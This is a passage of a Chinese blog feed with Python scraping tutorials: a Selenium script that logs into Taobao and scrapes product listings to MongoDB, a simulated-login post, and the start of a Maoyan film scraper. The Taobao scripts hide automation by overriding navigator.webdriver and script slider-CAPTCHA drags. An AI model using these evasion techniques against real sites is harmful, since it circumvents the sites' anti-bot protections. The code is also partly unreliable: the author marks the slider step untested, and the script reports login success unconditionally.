&#123;</span><br><span class="hljs-string">              get: () =&gt; undefined</span><br><span class="hljs-string">            &#125;)</span><br><span class="hljs-string">          &#x27;&#x27;&#x27;</span><br>&#125;)<br>wait = WebDriverWait(browser, <span class="hljs-number">5</span>)<br><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">do_slider</span>():</span><br>    <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">    处理滑动验证码，没有测试</span><br><span class="hljs-string">    :return:</span><br><span class="hljs-string">    &quot;&quot;&quot;</span><br>    slider_go = wait.until(<br>        EC.presence_of_element_located((By.CSS_SELECTOR, <span class="hljs-string">&#x27;#nc_1_n1z&#x27;</span>))<br>    )<br>    <span class="hljs-comment"># 实例化一个动作链关联游览器</span><br>    action = ActionChains(browser)<br>    action.reset_actions()<br>    <span class="hljs-comment"># 使用鼠标动作链进行点击并悬浮</span><br>    action.click_and_hold(slider_go)<br>    <span class="hljs-comment"># 滑动验证码</span><br>    action.move_by_offset(xoffset=<span class="hljs-number">258</span>, yoffset=<span class="hljs-number">0</span>).perform()<br>    time.sleep(<span class="hljs-number">5</span>)<br><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">login</span>(<span class="hljs-params">username, password</span>):</span><br>    print(<span class="hljs-string">&#x27;正在登陆......&#x27;</span>)<br>    browser.get(<span class="hljs-string">&#x27;https://login.taobao.com/member/login.jhtml&#x27;</span>)<br>    input_username = wait.until(<br>        EC.presence_of_element_located((By.CSS_SELECTOR, <span class="hljs-string">&#x27;#fm-login-id&#x27;</span>))<br>    )<br>    input_password = wait.until(<br>        EC.presence_of_element_located((By.CSS_SELECTOR, <span class="hljs-string">&#x27;#fm-login-password&#x27;</span>))<br>    )<br>    submit = wait.until(<br>        EC.element_to_be_clickable((By.CSS_SELECTOR, <span class="hljs-string">&#x27;#login-form &gt; div.fm-btn &gt; button&#x27;</span>))<br>    )<br>    input_username.send_keys(username)<br>    time.sleep(<span class="hljs-number">2</span>)<br>    input_password.send_keys(password)<br>    time.sleep(<span class="hljs-number">2</span>)<br>    submit.click()<br>    time.sleep(<span class="hljs-number">3</span>)  <span class="hljs-comment"># 等待检验滑块</span><br><br>    <span class="hljs-comment"># 判断有无滑块验证</span><br>    <span class="hljs-keyword">try</span>:<br>        slider = wait.until(<br>            EC.presence_of_element_located((By.CSS_SELECTOR, <span class="hljs-string">&#x27;#nc_1__scale_text &gt; span&#x27;</span>))<br>        )<br>        <span class="hljs-keyword">if</span> <span class="hljs-built_in">bool</span>(slider):<br>            print(<span class="hljs-string">&#x27;发现滑块验证码&#x27;</span>)<br>            do_slider()<br>            submit.click()<br>        <span class="hljs-keyword">else</span>:<br>            print(<span class="hljs-string">&#x27;未发现滑块&#x27;</span>)<br>            <span class="hljs-keyword">pass</span><br>    <span class="hljs-keyword">except</span>:<br>        print(<span class="hljs-string">&#x27;未发现滑块&#x27;</span>)<br><br>    time.sleep(<span class="hljs-number">5</span>)  <span class="hljs-comment"># 等待短信验证</span><br>    <span class="hljs-comment"># 判断有无短信验证</span><br>    <span class="hljs-keyword">try</span>:<br>        <span class="hljs-comment"># 定位iframe标签，由于iframe没有id，name这种唯一的属性，因此只能通过先定位，在切换实现</span><br>        frame = wait.until(<br>            EC.presence_of_element_located((By.XPATH, <span class="hljs-string">&#x27;//*[@id=&quot;content&quot;]/div/div[1]/iframe&#x27;</span>))<br>        )<br>        <span class="hljs-comment"># 由于手机验证页面出现了页面的嵌套，因此需要进行页面跳转到iframe下</span><br>        browser.switch_to.frame(frame)<br>        sms_button = wait.until(<br>            EC.presence_of_element_located((By.XPATH, <span class="hljs-string">&#x27;//*[@id=&quot;J_GetCode&quot;]&#x27;</span>))<br>        )<br>        <span class="hljs-keyword">if</span> <span class="hljs-built_in">bool</span>(sms_button):<br>            print(<span class="hljs-string">&#x27;发现短信验证码&#x27;</span>)<br>            time.sleep(<span class="hljs-number">1</span>)<br>            sms_button.click()<br>            print(<span class="hljs-string">&#x27;验证码已发送，请输入验证码（20s）&#x27;</span>)<br>            time.sleep(<span class="hljs-number">20</span>)<br>            sms_submit = wait.until(<br>                EC.element_to_be_clickable((By.CSS_SELECTOR, <span class="hljs-string">&#x27;#submitBtn&#x27;</span>))<br>            )<br>            sms_submit.click()<br>        <span class="hljs-keyword">else</span>:<br>            print(<span class="hljs-string">&#x27;无短信验证&#x27;</span>)<br>            <span class="hljs-keyword">pass</span><br>    <span class="hljs-keyword">except</span>:<br>        print(<span class="hljs-string">&#x27;无短信验证...&#x27;</span>)<br>        <span class="hljs-keyword">pass</span><br>    <span class="hljs-keyword">finally</span>:<br>        print(<span class="hljs-string">&#x27;登陆成功&#x27;</span>)<br><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">search</span>():</span><br>    print(<span class="hljs-string">&#x27;正在搜索.....&#x27;</span>)<br>    <span class="hljs-keyword">try</span>:<br>        browser.get(<span class="hljs-string">&#x27;https://www.taobao.com&#x27;</span>)<br>        <span class="hljs-comment"># 等待目标元素加载完成</span><br>        <span class="hljs-comment"># input = WebDriverWait(browser, 10).until(</span><br>        <span class="hljs-comment">#     EC.presence_of_all_elements_located(By.CSS_SELECTOR, &#x27;#q&#x27;)</span><br>        <span class="hljs-comment"># )</span><br>        <span class="hljs-comment"># submit = WebDriverWait(browser, 10).until(</span><br>        <span class="hljs-comment">#     EC.element_to_be_clickable(By.CSS_SELECTOR, &#x27;#J_TSearchForm &gt; div.search-button &gt; button&#x27;)</span><br>        <span class="hljs-comment"># )</span><br>        <span class="hljs-comment"># 改写WebDriverWait</span><br>        <span class="hljs-built_in">input</span> = wait.until(<br>            EC.presence_of_element_located((By.CSS_SELECTOR, <span class="hljs-string">&#x27;#q&#x27;</span>))<br>        )<br>        submit = wait.until(<br>            EC.element_to_be_clickable((By.CSS_SELECTOR, <span class="hljs-string">&#x27;#J_TSearchForm &gt; div.search-button &gt; button&#x27;</span>))<br>        )<br>        <span class="hljs-comment"># 输入内容</span><br>        <span class="hljs-built_in">input</span>.send_keys(<span class="hljs-string">&#x27;美食&#x27;</span>)<br>        submit.click()<br>        <span class="hljs-comment"># 获取总页数</span><br>        total = wait.until(<br>            EC.presence_of_element_located((By.CSS_SELECTOR, <span class="hljs-string">&#x27;#mainsrp-pager &gt; div &gt; div &gt; div &gt; div.total&#x27;</span>)))<br>        <span class="hljs-comment"># 第一页解析网页</span><br>        get_products()<br>        <span class="hljs-keyword">return</span> total.text<br>    <span class="hljs-keyword">except</span> TimeoutException:<br>        <span class="hljs-keyword">return</span> search()<br><br><br><span class="hljs-comment"># 翻页操作</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">next_page</span>(<span class="hljs-params">page_number</span>):</span><br>    print(<span class="hljs-string">&#x27;正在翻页......&#x27;</span>)<br>    <span class="hljs-keyword">try</span>:<br>        <span class="hljs-comment"># 到第几页</span><br>        <span class="hljs-built_in">input</span> = wait.until(<br>            EC.presence_of_element_located((By.CSS_SELECTOR, <span class="hljs-string">&#x27;#mainsrp-pager &gt; div &gt; div &gt; div &gt; div.form &gt; input&#x27;</span>))<br>        )<br>        <span class="hljs-comment"># 确定按钮</span><br>        submit = wait.until(<br>            EC.element_to_be_clickable(<br>                (By.CSS_SELECTOR, <span class="hljs-string">&#x27;#mainsrp-pager &gt; div &gt; div &gt; div &gt; div.form &gt; span.btn.J_Submit&#x27;</span>))<br>        )<br>        <span class="hljs-built_in">input</span>.clear()<br>        <span class="hljs-built_in">input</span>.send_keys(page_number)<br>        submit.click()<br>        <span class="hljs-comment"># 判断是否已翻到指定页面(*)</span><br>        wait.until(EC.text_to_be_present_in_element(<br>            (By.CSS_SELECTOR, <span class="hljs-string">&#x27;#mainsrp-pager &gt; div &gt; div &gt; div &gt; ul &gt; li.item.active &gt; span&#x27;</span>), <span class="hljs-built_in">str</span>(page_number)))<br>        <span class="hljs-comment"># 翻页后解析网页</span><br>        get_products()<br>    <span class="hljs-keyword">except</span> TimeoutException:<br>        <span class="hljs-keyword">return</span> next_page(page_number)<br><br><br><span class="hljs-comment"># 解析网页</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">get_products</span>():</span><br>    <span class="hljs-comment"># 商品信息是否存在</span><br>    wait.until(EC.presence_of_element_located((By.CSS_SELECTOR, <span class="hljs-string">&#x27;#mainsrp-itemlist .items .item&#x27;</span>)))<br>    <span class="hljs-comment"># 拿到网页源代码</span><br>    html = browser.page_source<br>    <span class="hljs-comment"># pyquery解析</span><br>    doc = pq(html)<br>    items = doc(<span class="hljs-string">&#x27;#mainsrp-itemlist .items .item&#x27;</span>).items()<br>    <span class="hljs-keyword">for</span> item <span class="hljs-keyword">in</span> items:<br>        product = &#123;<br>            <span class="hljs-string">&#x27;image&#x27;</span>: item.find(<span class="hljs-string">&#x27;.pic .img&#x27;</span>).attr(<span class="hljs-string">&#x27;src&#x27;</span>),<br>            <span class="hljs-string">&#x27;price&#x27;</span>: item.find(<span class="hljs-string">&#x27;.price&#x27;</span>).text(),<br>            <span class="hljs-string">&#x27;deal&#x27;</span>: item.find(<span class="hljs-string">&#x27;.deal-cnt&#x27;</span>).text()[:-<span class="hljs-number">3</span>],<br>            <span class="hljs-string">&#x27;title&#x27;</span>: item.find(<span class="hljs-string">&#x27;.title&#x27;</span>).text(),<br>            <span class="hljs-string">&#x27;shop&#x27;</span>: item.find(<span class="hljs-string">&#x27;.shop&#x27;</span>).text(),<br>            <span class="hljs-string">&#x27;location&#x27;</span>: item.find(<span class="hljs-string">&#x27;.location&#x27;</span>).text()<br>        &#125;<br>        print(product)<br>        save_to_mongo(product)<br><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">save_to_mongo</span>(<span class="hljs-params">result</span>):</span><br>    print(<span class="hljs-string">&#x27;正在加入数据库......&#x27;</span>)<br>    <span class="hljs-keyword">try</span>:<br>        <span class="hljs-keyword">if</span> db[MONGO_TABLE].insert(result):<br>            print(<span class="hljs-string">&#x27;存储到MONGODB成功&#x27;</span>, result)<br>    <span class="hljs-keyword">except</span> Exception:<br>        print(<span class="hljs-string">&#x27;存储异常&#x27;</span>, result)<br><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">main</span>():</span><br>    print(<span class="hljs-string">&#x27;开始运行.......&#x27;</span>)<br>    login(<span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>)<br>    total = search()<br>    total = <span class="hljs-built_in">int</span>(re.<span class="hljs-built_in">compile</span>(<span class="hljs-string">&#x27;(\d+)&#x27;</span>).search(total).group(<span class="hljs-number">1</span>))<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">2</span>, total + <span class="hljs-number">1</span>):<br>        next_page(i)<br>    browser.close()<br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    main()<br></code></pre></td></tr></table></figure><h1 id="补充"><a href="#补充" class="headerlink" title="补充"></a>补充</h1><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs reasonml">chrome_options.add<span class="hljs-constructor">_argument(&#x27;--<span class="hljs-params">user</span>-<span class="hljs-params">agent</span>=<span class="hljs-string">&quot;&quot;</span>&#x27;)</span>  # 设置请求头的User-Agent<br>chrome_options.add<span class="hljs-constructor">_argument(&#x27;--<span class="hljs-params">window</span>-<span class="hljs-params">size</span>=1280x1024&#x27;)</span>  # 设置浏览器分辨率（窗口大小）<br>chrome_options.add<span class="hljs-constructor">_argument(&#x27;--<span class="hljs-params">start</span>-<span class="hljs-params">maximized</span>&#x27;)</span>  # 最大化运行（全屏窗口）,不设置，取元素会报错<br>chrome_options.add<span class="hljs-constructor">_argument(&#x27;--<span class="hljs-params">disable</span>-<span class="hljs-params">infobars</span>&#x27;)</span>  # 禁用浏览器正在被自动化程序控制的提示<br>chrome_options.add<span class="hljs-constructor">_argument(&#x27;--<span class="hljs-params">incognito</span>&#x27;)</span>  # 隐身模式（无痕模式）<br>chrome_options.add<span class="hljs-constructor">_argument(&#x27;--<span class="hljs-params">hide</span>-<span class="hljs-params">scrollbars</span>&#x27;)</span>  # 隐藏滚动条, 应对一些特殊页面<br>chrome_options.add<span class="hljs-constructor">_argument(&#x27;--<span class="hljs-params">disable</span>-<span class="hljs-params">javascript</span>&#x27;)</span>  # 禁用javascript<br>chrome_options.add<span class="hljs-constructor">_argument(&#x27;--<span class="hljs-params">blink</span>-<span class="hljs-params">settings</span>=<span class="hljs-params">imagesEnabled</span>=<span class="hljs-params">false</span>&#x27;)</span>  # 不加载图片, 提升速度<br>chrome_options.add<span class="hljs-constructor">_argument(&#x27;--<span class="hljs-params">headless</span>&#x27;)</span>  # 浏览器不提供可视化页面<br><br>chrome_options.add<span class="hljs-constructor">_argument(&#x27;--<span class="hljs-params">ignore</span>-<span class="hljs-params">certificate</span>-<span class="hljs-params">errors</span>&#x27;)</span>  # 禁用扩展插件并实现窗口最大化<br>chrome_options.add<span class="hljs-constructor">_argument(&#x27;--<span class="hljs-params">disable</span>-<span class="hljs-params">gpu</span>&#x27;)</span>  # 禁用GPU加速<br>chrome_options.add<span class="hljs-constructor">_argument(&#x27;–<span class="hljs-params">disable</span>-<span class="hljs-params">software</span>-<span class="hljs-params">rasterizer</span>&#x27;)</span><br>chrome_options.add<span class="hljs-constructor">_argument(&#x27;--<span class="hljs-params">disable</span>-<span class="hljs-params">extensions</span>&#x27;)</span><br>chrome_options.add<span class="hljs-constructor">_argument(&#x27;--<span class="hljs-params">start</span>-<span class="hljs-params">maximized</span>&#x27;)</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    
    <tags>
      
      <tag>python</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Selenium模拟淘宝登陆的一次尝试</title>
    <link href="/2021/01/59.html"/>
    <url>/2021/01/59.html</url>
    
    <content type="html"><![CDATA[<blockquote><p>最近在研究python爬虫，因为教程是前几年的，所以随着网站的迭代，实战部分出现了很多新的问题。出现问题解决问题go~</p></blockquote><a id="more"></a><p>今天先说说selenium被识别如何解决？</p><h1 id="解决Selenium被识别"><a href="#解决Selenium被识别" class="headerlink" title="解决Selenium被识别"></a>解决Selenium被识别</h1><ul><li>Selenium被监测出来一般是在JS代码里判断，加上execute_cdp_cmd后面的这句话就好了<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> selenium <span class="hljs-keyword">import</span> webdriver<br><br><span class="hljs-comment"># 实例化driver</span><br>driver = webdriver.Chrome()<br><span class="hljs-comment"># 防止被监测</span><br>driver.execute_cdp_cmd(<span class="hljs-string">&quot;Page.addScriptToEvaluateOnNewDocument&quot;</span>, &#123;<br>  <span class="hljs-string">&quot;source&quot;</span>: <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">    Object.defineProperty(navigator, &#x27;webdriver&#x27;, &#123;</span><br><span class="hljs-string">      get: () =&gt; undefined</span><br><span class="hljs-string">    &#125;)</span><br><span class="hljs-string">  &quot;&quot;&quot;</span><br>&#125;)<br></code></pre></td></tr></table></figure><h1 id="Selenium的options配置"><a href="#Selenium的options配置" class="headerlink" title="Selenium的options配置"></a>Selenium的options配置</h1><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs reasonml">from selenium import webdriver<br>chrome_options = webdriver.<span class="hljs-constructor">ChromeOptions()</span><br>chrome_options.add<span class="hljs-constructor">_argument(&#x27;--<span class="hljs-params">no</span>-<span class="hljs-params">sandbox</span>&#x27;)</span>  # 解决DevToolsActivePort文件不存在的报错<br>chrome_options.add<span class="hljs-constructor">_argument(&#x27;<span class="hljs-params">window</span>-<span class="hljs-params">size</span>=1920x1080&#x27;)</span>  # 指定浏览器分辨率<br>chrome_options.add<span class="hljs-constructor">_argument(&#x27;--<span class="hljs-params">disable</span>-<span class="hljs-params">gpu</span>&#x27;)</span>  # 谷歌文档提到需要加上这个属性来规避bug<br>chrome_options.add<span class="hljs-constructor">_argument(&#x27;--<span class="hljs-params">hide</span>-<span class="hljs-params">scrollbars</span>&#x27;)</span>  # 隐藏滚动条, 应对一些特殊页面<br>chrome_options.add<span class="hljs-constructor">_argument(&#x27;<span class="hljs-params">blink</span>-<span class="hljs-params">settings</span>=<span class="hljs-params">imagesEnabled</span>=<span class="hljs-params">false</span>&#x27;)</span>  # 不加载图片, 提升速度<br>chrome_options.add<span class="hljs-constructor">_argument(&#x27;--<span class="hljs-params">headless</span>&#x27;)</span>  # 浏览器不提供可视化页面. linux下如果系统不支持可视化不加这条会启动失败<br></code></pre></td></tr></table></figure><h1 id="爬虫上线的Selenium配置"><a href="#爬虫上线的Selenium配置" class="headerlink" title="爬虫上线的Selenium配置"></a>爬虫上线的Selenium配置</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> selenium <span class="hljs-keyword">import</span> webdriver<br><br><br>chrome_options = webdriver.ChromeOptions()<br>chrome_options.add_argument(<span class="hljs-string">&#x27;--no-sandbox&#x27;</span>)  <br>chrome_options.add_argument(<span class="hljs-string">&#x27;--disable-gpu&#x27;</span>)  <br>chrome_options.add_argument(<span class="hljs-string">&#x27;blink-settings=imagesEnabled=false&#x27;</span>) <br>chrome_options.add_argument(<span class="hljs-string">&#x27;--headless&#x27;</span>) <br><br>driver = webdriver.Chrome(<br>executable_path=<span class="hljs-string">&#x27;C:\Program Files (x86)\Google\Chrome\Application\chromedriver.exe&#x27;</span>, <span class="hljs-comment"># 不是Window不需要加</span><br>    options = chrome_options,<br>)<br><br>driver.execute_cdp_cmd(<span class="hljs-string">&quot;Page.addScriptToEvaluateOnNewDocument&quot;</span>, &#123;<br>  <span class="hljs-string">&quot;source&quot;</span>: <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">    Object.defineProperty(navigator, &#x27;webdriver&#x27;, &#123;</span><br><span class="hljs-string">      get: () =&gt; undefined</span><br><span class="hljs-string">    &#125;)</span><br><span class="hljs-string">  &quot;&quot;&quot;</span><br>&#125;)<br></code></pre></td></tr></table></figure></li><li>上述内容来自<a href="https://blog.csdn.net/kzl_knight/article/details/106613495">https://blog.csdn.net/kzl_knight/article/details/106613495</a></li></ul><hr><h1 id="模拟登陆实现"><a href="#模拟登陆实现" class="headerlink" title="模拟登陆实现"></a>模拟登陆实现</h1><ul><li>知道了上面的内容（其实不是很懂，复制粘贴就完了），实现模拟登陆就比较容易了<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># -*- coding: utf-8 -*-</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">@Time ： 2021/1/25 19:28</span><br><span class="hljs-string">@Auth ： Ne-21</span><br><span class="hljs-string">@File ：taobao_login.py</span><br><span class="hljs-string">@IDE ：PyCharm</span><br><span class="hljs-string">@Motto：Another me.</span><br><span class="hljs-string"></span><br><span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-keyword">from</span> selenium <span class="hljs-keyword">import</span> webdriver<br><span class="hljs-keyword">from</span> selenium.webdriver.common.by <span class="hljs-keyword">import</span> By<br><span class="hljs-keyword">from</span> selenium.webdriver.support.ui <span class="hljs-keyword">import</span> WebDriverWait<br><span class="hljs-keyword">from</span> selenium.webdriver.support <span class="hljs-keyword">import</span> expected_conditions <span class="hljs-keyword">as</span> EC<br><span class="hljs-keyword">from</span> selenium.webdriver <span class="hljs-keyword">import</span> ActionChains<br><span class="hljs-keyword">import</span> time<br><br>options = webdriver.ChromeOptions()<br>browser = webdriver.Chrome(options=options)<br><span class="hljs-comment"># 防止被监测</span><br>browser.execute_cdp_cmd(<span class="hljs-string">&quot;Page.addScriptToEvaluateOnNewDocument&quot;</span>, &#123;<br>    <span class="hljs-string">&quot;source&quot;</span>: <span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">            Object.defineProperty(navigator, &#x27;webdriver&#x27;, &#123;</span><br><span class="hljs-string">              get: () =&gt; undefined</span><br><span class="hljs-string">            &#125;)</span><br><span class="hljs-string">          &#x27;&#x27;&#x27;</span><br>&#125;)<br>wait = WebDriverWait(browser, <span class="hljs-number">5</span>)<br><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">do_slider</span>():</span><br>    <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">    处理滑动验证码，没有测试</span><br><span class="hljs-string">    :return:</span><br><span class="hljs-string">    &quot;&quot;&quot;</span><br>    slider_go = wait.until(<br>        EC.presence_of_element_located((By.CSS_SELECTOR, <span class="hljs-string">&#x27;#nc_1_n1z&#x27;</span>))<br>    )<br>    <span class="hljs-comment"># 实例化一个动作链关联游览器</span><br>    action = ActionChains(browser)<br>    action.reset_actions()<br>    <span class="hljs-comment"># 使用鼠标动作链进行点击并悬浮</span><br>    action.click_and_hold(slider_go)<br>    <span class="hljs-comment"># 滑动验证码</span><br>    action.move_by_offset(xoffset=<span class="hljs-number">258</span>, yoffset=<span class="hljs-number">0</span>).perform()<br>    time.sleep(<span class="hljs-number">1</span>)<br><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">login</span>(<span class="hljs-params">username, password</span>):</span><br>    browser.get(<span class="hljs-string">&#x27;https://login.taobao.com/member/login.jhtml&#x27;</span>)<br>    input_username = wait.until(<br>        EC.presence_of_element_located((By.CSS_SELECTOR, <span class="hljs-string">&#x27;#fm-login-id&#x27;</span>))<br>    )<br>    input_password = wait.until(<br>        EC.presence_of_element_located((By.CSS_SELECTOR, <span class="hljs-string">&#x27;#fm-login-password&#x27;</span>))<br>    )<br>    submit = wait.until(<br>        EC.element_to_be_clickable((By.CSS_SELECTOR, <span class="hljs-string">&#x27;#login-form &gt; div.fm-btn &gt; button&#x27;</span>))<br>    )<br>    input_username.send_keys(username)<br>    time.sleep(<span class="hljs-number">2</span>)<br>    input_password.send_keys(password)<br>    time.sleep(<span class="hljs-number">2</span>)<br>    submit.click()<br>    time.sleep(<span class="hljs-number">3</span>)  <span class="hljs-comment"># 等待检验滑块</span><br><br>    <span class="hljs-comment"># 判断有无滑块验证</span><br>    <span class="hljs-keyword">try</span>:<br>        slider = wait.until(<br>            EC.presence_of_element_located((By.CSS_SELECTOR, <span class="hljs-string">&#x27;#nc_1__scale_text &gt; span&#x27;</span>))<br>        )<br>        <span class="hljs-keyword">if</span> <span class="hljs-built_in">bool</span>(slider):<br>            print(<span class="hljs-string">&#x27;发现滑块验证码&#x27;</span>)<br>            time.sleep(<span class="hljs-number">2</span>)<br>            do_slider()<br>            submit.click()<br>        <span class="hljs-keyword">else</span>:<br>            print(<span class="hljs-string">&#x27;未发现滑块&#x27;</span>)<br>            <span class="hljs-keyword">pass</span><br>    <span class="hljs-keyword">except</span>:<br>        print(<span class="hljs-string">&#x27;未发现滑块&#x27;</span>)<br>    <span class="hljs-keyword">finally</span>:<br>        print(<span class="hljs-string">&#x27;登录成功&#x27;</span>)<br><br><br><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">main</span>():</span><br>    login(username=<span class="hljs-string">&#x27;&#x27;</span>, password=<span class="hljs-string">&#x27;&#x27;</span>)<br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    main()<br><br></code></pre></td></tr></table></figure></li></ul>]]></content>
    
    
    
    <tags>
      
      <tag>python</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Requests+正则表达式爬取猫眼电影TOP100</title>
    <link href="/2021/01/58.html"/>
    <url>/2021/01/58.html</url>
    
    <content type="html"><![CDATA[<blockquote><p>般爬猫眼电影有两种方法，一种就像我前段时间写的豆瓣电影爬取方法一样，可以只获取全部电影所在的详情页内容，<br>然后利用 正则表达式 一个一个提取，另一种就是先获取全部电影所在的详情页内容，在分别获取每个电影对应的详情页内容，再利用 正则表达式 或 pyquery 获取。</p></blockquote><a id="more"></a><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># -*- coding: utf-8 -*-</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">@Time ： 2021/1/24 15:52</span><br><span class="hljs-string">@Auth ： Ne-21</span><br><span class="hljs-string">@File ：maoyan_spider.py</span><br><span class="hljs-string">@IDE ：PyCharm</span><br><span class="hljs-string">@Motto：Another me.</span><br><span class="hljs-string"></span><br><span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">from</span> requests.exceptions <span class="hljs-keyword">import</span> RequestException<br><span 